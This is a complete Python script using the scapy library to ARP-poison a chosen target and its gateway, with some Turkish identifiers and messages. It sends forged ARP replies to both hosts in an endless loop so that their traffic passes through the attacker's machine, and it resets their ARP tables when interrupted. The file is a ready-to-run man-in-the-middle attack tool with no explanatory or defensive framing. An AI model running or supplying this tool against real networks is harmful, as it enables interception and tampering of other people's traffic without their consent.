#echo 1 > /proc/sys/net/ipv4/ip_forward
import scapy.all as scapy
import time

def get_mac(ip):
	arp_request_packet = scapy.ARP(pdst=ip)
	broadcast_request = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
	combined_packet = broadcast_request/arp_request_packet
	answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]
	return answered_list[0][1].hwsrc

def arp_poisoning(target_ip,modem_ip):
	target_mac =get_mac(target_ip)
	arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=modem_ip)
	scapy.send(arp_response,verbose=False)

def reset_operation(fooled_ip,gateway_ip):
	fooled_mac =get_mac(fooled_ip)
	gateway_mac = get_mac(gateway_ip)
	arp_response = scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip)
	scapy.send(arp_response,verbose=False,count=6)

hedef_ip = input('Enter a target ip: ')
modem_ip = input('Enter a modem ip: ')
hedef_ip = str(hedef_ip)
modem_ip = str(modem_ip)

number = 0

try:
	while True:
		arp_poisoning(hedef_ip,modem_ip)
		arp_poisoning(modem_ip,hedef_ip)
		number +=2 
		print('[+] sending packets '+ str(number))
		time.sleep(3)
except KeyboardInterrupt:
	print(" Program durdu!!")  
	reset_operation(hedef_ip,modem_ip)
	reset_operation(modem_ip,hedef_ip)
